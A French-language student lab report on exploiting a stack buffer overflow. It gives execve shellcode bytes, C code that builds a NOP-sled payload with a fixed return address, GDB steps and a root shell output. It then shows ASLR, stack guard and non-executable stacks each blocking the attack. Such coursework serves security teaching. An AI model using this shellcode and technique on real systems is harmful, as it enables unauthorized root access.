# Rapport TP `bufoverflow`

## Tâche 1 : Exploitation de la vulnérabilité

Pour exploiter la vulnérabilité de "buffer overflow", deux étapes principales sont nécessaires :
- Ajouter le **shellcode** à la fin du tampon (buffer).
- Écraser l'adresse de retour avec un pointeur vers le shellcode.

### Code fourni

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

unsigned long get_sp(void) {
   __asm__("movl %esp, %eax");
}

void main(int argc, char *argv[]) {
    char buffer[1000];
    FILE *badfile;

    /* Initialise le buffer avec des instructions NOP (0x90) */
    memset(&buffer, 0x90, 1000);

    /* Vous devez remplir le tampon avec le contenu approprié ici */

    /* Sauvegarde le contenu dans le fichier "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 1000, 1, badfile);
    fclose(badfile);
}
```

Ce programme initialise un tampon (buffer) de 1000 octets avec des instructions NOP (0x90), puis l'écrit dans un fichier appelé `badfile`.

### Ajout du shellcode

Dans le programme, nous devons ajouter le shellcode à la fin du tampon en utilisant le code suivant :

```c
int shell_offset = sizeof(buffer) - sizeof(shellcode);
for (int i = 0; i < sizeof(shellcode); i++) {
    buffer[shell_offset + i] = shellcode[i];
}
```

Ce code insère le shellcode à la fin du tampon pour s'assurer qu'il est bien dans la zone débordante (overflow) du tampon.

### Écrasement de l'adresse de retour

Pour écraser l'adresse de retour, nous devons d'abord localiser l'adresse du tampon en mémoire. Cela peut être fait en déboguant le programme et en affichant l'adresse du tampon avec les étapes suivantes dans GDB :

```
$> gdb -q stack
(gdb) disas bof
(gdb) break *0x080484ca
(gdb) r
(gdb) i r $ebp
```

_Le résultat est montré dans l'image `gdb.png`_

Voici une explication des commandes :
- `disas bof` : désassemble la fonction `bof` pour trouver l'adresse du tampon.
- `break *0x080484ca` : place un point d'arrêt à la fin de la fonction `bof`.
- `r` : exécute le programme.
- `i r $ebp` : affiche la valeur du registre `ebp`, qui pointe vers la base de la pile (stack frame).

En fonction du résultat obtenu (`0xffffd2a8`), on peut ajouter un décalage (offset) pour que l'adresse de retour pointe vers la "NOP sled", qui finira par atteindre le shellcode. Pour cela, nous modifions l'adresse en `0xffffd3a8`.

L'ajout de cette adresse de retour dans le programme se fait ainsi :

```c
#define BUFFER_SIZE 293
...
int main(int argc, char *argv[]) {
    ...
    for (int i = BUFFER_SIZE%4; i <= BUFFER_SIZE + 16; i++) {
        *(buffer + i) = 0xa8;
        *(buffer + i + 1) = 0xd3;
        *(buffer + i + 2) = 0xff;
        *(buffer + i + 3) = 0xff;
    }
    ...
}
```

### Exécution de l'exploit

Après avoir compilé et exécuté l'exploit, voici les résultats obtenus :

```
$> gcc -o exploit exploit.c
$> ./exploit
$> ./stack
# cat /root/.secret
# Ce fichier secret est généré lorsque le conteneur est créé
# La chaîne secrète root ci-dessous est remplacée par un hachage clé
My ROOT secret string is: 85bdbafcdbace591a72f87e42f641fd2

# id
uid=1000(ubuntu) gid=1000(ubuntu) euid=0(root) groups=1000(ubuntu),27(sudo)
```

## Tâche 2 : Randomisation des adresses

Nous avons activé la randomisation des adresses, puis exécuté le script `whilebash.sh` pour lancer l'exploit plusieurs fois.

L'exploit échoue (comme montré dans `while.png`) lorsque la randomisation des adresses est activée. Cela s'explique par le fait que l'adresse du tampon est randomisée à chaque exécution du programme, rendant impossible l'utilisation d'une adresse de retour fixe. Le seul scénario où l'exploit pourrait fonctionner est si, par chance, l'adresse du tampon tombe dans la NOP sled. Mais en réalité, la probabilité est trop faible avec l'espace d'adressage aléatoire actuel.

## Tâche 3 : Stack Guard

Après avoir désactivé la randomisation des adresses, nous avons activé le stack guard (protection contre le débordement de tampon). En exécutant l'exploit, celui-ci échoue (`squash.png`). Le stack guard détecte le dépassement de tampon et arrête le programme avant que le shellcode ne soit exécuté. C'est une protection efficace contre ce type d'attaque.

## Tâche 4 : Pile non-exécutable

Nous avons ensuite désactivé le stack guard et activé la protection de pile non-exécutable (non-executable stack). À nouveau, l'exploit échoue (`non-exec.png`), car la pile est marquée comme non-exécutable. Cela signifie que même si le shellcode est dans la pile, il ne peut pas être exécuté. Ce mécanisme de sécurité empêche directement les attaques de type exécution de code sur la pile.

## Conclusion

En conclusion, l'exploit de dépassement de tampon fonctionne uniquement lorsque la randomisation des adresses est désactivée, le stack guard est désactivé, et la pile est exécutable. Si l'une de ces protections est activée, l'exploit échoue. Cela montre l'importance des mécanismes de sécurité modernes pour prévenir les attaques par dépassement de tampon. Ces mesures sont essentielles pour protéger les programmes contre les vulnérabilités critiques qui pourraient compromettre un système.
